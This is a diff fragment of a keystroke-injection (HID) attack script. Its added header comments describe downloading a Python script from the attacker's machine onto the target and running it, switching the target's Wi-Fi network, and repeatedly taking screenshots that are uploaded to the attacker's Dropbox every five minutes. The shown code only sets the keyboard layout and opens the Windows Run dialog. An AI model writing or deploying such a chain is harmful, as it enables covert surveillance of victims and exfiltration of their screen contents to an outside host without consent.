@@ -1,3 +1,10 @@
+// Aashish Aryal
+// HID script to download download_dropbox.py and run it via attacker's machine on target machine
+// The download_dropbox.py script then downloads the rest of the scripts.
+// This HID script then runs switch_wifi.py to switch network of the target machine.
+// Then gets the new ip-address of the target machine after switching network.
+// Finally, it runs screenshot.py to take a screenshot of the target machine and upload them to attacker's dropbox every 5 minutes.
+
 layout("US")
 delay(500)
 press("GUI r") // Open Run dialog
